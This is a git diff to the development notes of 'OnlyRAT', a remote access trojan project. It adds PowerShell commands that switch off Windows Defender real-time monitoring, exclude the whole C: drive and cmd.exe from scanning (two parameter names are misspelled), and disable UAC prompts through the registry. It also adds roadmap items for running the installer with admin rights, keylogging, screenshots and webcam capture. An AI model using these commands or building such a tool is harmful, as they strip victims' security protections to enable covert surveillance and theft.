@@ -1,4 +1,4 @@
-# Project: OnlyRAT
+# Project: OnlyRAT [INCOMPLETE]
 > Blue Cosmo | 01/07/2022
 ---
 
@@ -27,6 +27,18 @@ attrib -h -s -r FILE
 attrib +h +s +r FILE
 ```
 
+## exclusion path
+```
+Set-MpPreference -DisableRealtimeMonitoring true
+Add-MpPreference -ExclusionPatch c:\
+Add-MpPreference -EsclusionProcess c:\windows\system32\cmd.exe
+```
+
+# disable uac
+```powershell
+Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+```
+
 ## Components:
 - keylogger
 	- backspace detection
@@ -50,7 +62,9 @@ attrib +h +s +r FILE
 - custom uploads
 
 ## Roadmap:
-- initial staging
+- run installer with adminpriv
+	- wget `powershell ...` to disasble uac
+- vbs special folders
 - redevelop keylogger
 - screenshots
 - webcam
